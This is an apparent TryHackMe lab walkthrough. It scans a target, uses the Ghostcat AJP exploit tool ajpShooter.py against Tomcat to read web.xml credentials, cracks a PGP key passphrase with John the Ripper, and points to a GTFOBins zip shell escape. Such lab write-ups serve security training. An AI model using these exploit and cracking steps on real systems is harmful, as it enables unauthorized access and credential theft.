```
mkdir nmap
nmap -sC -sV -oN nmap/initial $IP
```
We can see that `8080` is open

Navigate to $IP:8080 on browser

Search for tomcat vulnerabilities on google or `ghostcat github exploit`

Clone down tool called `ajpShooter.py`

```
python ajpShooter.py http://10.10.249.149:8080/ 8009 /WEB-INF/web.xml read
```

ssh using the credentials that fell out. 

We have a `tryhackme.asc` file that is a pgp key.

```
/opt/JohnTheRipper/run/gpg2john tryhackme.asc > hashes_for_john.txt
/opt/JohnTheRipper/run/john --wordlist /opt/rockyou.txt hashes_for_john.txt 
```

Found password. Now we import the asc file using the password.
```
gpg --import tryhackme.asc
```

See whats in there.
```
gpg --decrypt credential.pgp
```

We get another user/password. And there is a flag.

What can we run?
```
sudo -l
```

We find something. Let's go check `gtfobins.github.io`! We can get a shell from zip...
